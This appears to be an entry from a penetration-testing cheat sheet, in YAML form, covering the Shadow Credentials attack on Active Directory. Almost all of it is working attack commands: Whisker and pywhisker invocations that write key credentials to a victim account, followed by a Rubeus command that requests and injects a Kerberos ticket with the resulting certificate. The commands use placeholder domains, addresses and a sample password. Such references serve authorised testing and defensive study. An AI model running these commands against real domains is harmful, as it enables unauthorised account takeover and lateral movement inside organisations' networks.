---
description: |
  Whisker — add Shadow Credentials (msDS-KeyCredentialLink) to an AD
  object for PKINIT authentication. Requires GenericAll/GenericWrite.
command: |
  # Add shadow credentials
  .\Whisker.exe add /target:victim /domain:test.local /dc:10.10.10.1

  # List shadow credentials
  .\Whisker.exe list /target:victim /domain:test.local /dc:10.10.10.1

  # Remove shadow credentials
  .\Whisker.exe remove /target:victim /domain:test.local /dc:10.10.10.1 /deviceid:DEVICE_ID

  # From Linux with pywhisker
  python3 pywhisker.py -d test.local -u pentuser -p 'P@ssw0rd123' --target victim --action add --dc-ip 10.10.10.1

  # Authenticate with obtained certificate
  .\Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:PASSWORD /ptt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
items:
  - Username
  - Password
  - Shell
techniques:
  - Shadow_Credentials
  - ACL_Abuse
network_position:
  - Internal
  - Local
references:
  - https://github.com/eladshamir/Whisker
  - https://github.com/ShutdownRepo/pywhisker
---
